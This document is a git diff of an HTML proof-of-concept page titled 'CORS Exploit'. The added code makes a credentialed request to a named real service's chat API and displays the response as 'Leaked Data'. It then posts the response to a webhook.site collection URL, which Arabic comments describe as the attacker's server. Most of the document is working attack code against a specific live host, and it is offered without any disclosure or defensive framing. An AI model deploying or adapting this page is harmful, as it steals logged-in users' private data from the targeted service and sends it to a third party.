@@ -1,29 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Exploit</title>
+  <title>CORS Exploit</title>
 </head>
 <body>
   <h2>Loading...</h2>
 
   <script>
-    fetch("https://agents.hostinger.com/api/message-hub/api/v1/chat/respond", {
-      method: "POST",
-      credentials: "include",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        message: "Hello"
-      })
-    })
-    .then(res => res.text())
-    .then(data => {
-      document.body.innerHTML = "<pre>" + data + "</pre>";
-    })
-    .catch(err => {
-      document.body.innerHTML = "Error: " + err;
-    });
+    async function exploit() {
+      try {
+        const res = await fetch("https://agents.hostinger.com/api/message-hub/api/v1/chat/respond", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            message: "Hello from attacker"
+          })
+        });
+
+        const text = await res.text();
+
+        // عرض البيانات على الصفحة
+        document.body.innerHTML = "<h3>Leaked Data:</h3><pre>" + text + "</pre>";
+
+        // إرسال البيانات لسيرفر المهاجم (اختياري)
+        await fetch("https://webhook.site/YOUR-ID", {
+          method: "POST",
+          body: text
+        });
+
+      } catch (e) {
+        document.body.innerHTML = "Error: " + e;
+      }
+    }
+
+    exploit();
   </script>
 
 </body>
